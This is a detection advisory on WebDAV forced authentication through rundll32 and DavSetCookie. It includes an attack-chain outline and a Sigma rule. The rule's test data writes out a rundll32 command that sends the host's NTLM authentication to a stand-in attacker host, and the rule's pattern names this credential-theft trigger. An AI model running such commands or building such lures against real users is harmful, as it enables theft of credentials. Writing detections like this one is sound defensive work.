---
title: Detection of Rare WebDAV Connections for Forced Authentication
slug: 2026-08-rare-webdav-connection
description: Detection rule identifies potential credential theft via Forced Authentication where attackers leverage WebDAV to trigger NTLM authentication requests from a victim's host.
date: "2026-08-21T13:07:51Z"
type: advisory
types:
  - advisory
severities:
  - medium
affected_os:
  - Windows
mitre_ttps:
  - tactic_id: TA0006
    tactic_name: Credential Access
    technique_id: T1187
    technique_name: Forced Authentication
    evidence: Attackers may inject WebDAV paths in files or features opened by a victim user to leak their NTLM credentials via forced authentication.
    confidence_band: high
  - tactic_id: TA0005
    tactic_name: Defense Evasion
    technique_id: T1218.011
    technique_name: Rundll32
    evidence: Adversaries may abuse rundll32.exe to trigger the connection via DavSetCookie.
    confidence_band: high
action_plan:
  priority: elevated
  owners:
    - Detection Engineering
    - SOC
  immediate_actions:
    - action: Deploy Sigma rule for rundll32 WebDAV detection.
      owner: Detection Engineering
      due: 48h
  hunt_leads:
    - lead: Search for rare domains in rundll32 command lines.
      technique_id: T1187
      data_needed:
        - Process creation logs with full command lines.
      priority: medium
      confidence: medium
      disposition: convert_to_detection
---

This detection brief addresses the abuse of Web Distributed Authoring and Versioning (WebDAV) to facilitate credential theft through forced authentication. Attackers inject malicious WebDAV paths into files or features - such as LNK files, documents, or UI elements - that, when accessed by a victim, cause the Windows host to initiate an NTLM authentication attempt against a server controlled by the attacker. By utilizing `rundll32.exe` to trigger these connections via `DavSetCookie`, adversaries can bypass standard defensive perimeters and capture NetNTLM hashes for offline cracking or relaying. This technique allows for credential access without requiring direct exploit code execution on the endpoint, instead abusing legitimate system binaries and network protocols to exfiltrate identity material.

## Attack Chain

1. Attacker hosts a malicious WebDAV server infrastructure accessible over the internet.
2. Attacker crafts a lure file (e.g., LNK file or Office document) containing a URI pointing to the malicious WebDAV resource.
3. Victim opens the lure file on a Windows host.
4. The host process invokes `rundll32.exe` with `url.dll,DavSetCookie` or similar parameters to attempt a connection to the URI.
5. The Windows WebClient service automatically attempts NTLM authentication to the remote WebDAV server to establish the connection.
6. The attacker's server captures the incoming NetNTLM hash during the handshake.
7. Attacker performs offline password cracking or relays the hash to gain further access within the environment.

## Impact

Successful exploitation results in the compromise of user credentials, facilitating further lateral movement, privilege escalation, or full account takeover. The scope of impact is highly dependent on the victim's account privileges, but it frequently leads to domain-wide compromise if the captured credentials have elevated permissions.

## Recommendation

Deploy the provided Sigma rule to detect anomalous `rundll32.exe` execution patterns indicating WebDAV interaction. Enable process-creation auditing across all Windows endpoints to capture command-line arguments. Review logs for connections to unknown or newly observed domains initiated by `rundll32.exe`. If an alert triggers, inspect the destination domain reputation and verify if the user activity corresponds to an expected business task or an inadvertent link/file interaction.

## Rules

- title: "Detect Rare Connection to WebDAV Target via Rundll32"
 description: "Detects suspicious rundll32.exe process creation involving DavSetCookie, which is indicative of potential WebDAV-based forced authentication attacks."
 logsource:
 category: "process_creation"
 product: "windows"
 detection:
 selection:
 Image|endswith: "\\rundll32.exe"
 CommandLine|contains: "DavSetCookie"
 condition: selection
 level: "medium"
 tags:
 - "attack.credential_access"
 - "attack.t1187"
 - "attack.t1218.011"
 tests:
 positive:
 - name: "Rundll32 DavSetCookie execution"
 data:
 - Image: "C:\\Windows\\System32\\rundll32.exe"
 CommandLine: "rundll32.exe url.dll,DavSetCookie http://malicious.example.com/test"
 negative:
 - name: "Legitimate browser execution"
 data:
 - Image: "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"
 CommandLine: "chrome.exe"
 falsepositives:
 - "Legitimate administrative tools or software installers that legitimately utilize WebDAV resources for file synchronization or internal updates."
 handoff:
 detection_confidence: "medium"
 required_telemetry:
 - log_source: "Windows Event ID 4688 or Sysmon Event ID 1"
 event_or_channel: "Process Creation"
 required_fields:
 - "Image"
 - "CommandLine"
 availability: "available"
 notes: "Requires command-line auditing enabled."
 validation:
 status: "needs_environment_validation"
 steps:
 - "Execute 'rundll32.exe url.dll,DavSetCookie http://127.0.0.1/test' in a controlled lab environment."
 known_evasions:
 - "Use of alternative binaries to trigger WebDAV authentication."
 limitations:
 - "Only detects execution via rundll32.exe."
 tuning:
 - source: "Internal file sync services"
 guidance: "Add known internal and trusted WebDAV servers to an allowlist in the detection logic."
 suggested_owner: "Detection Engineering"
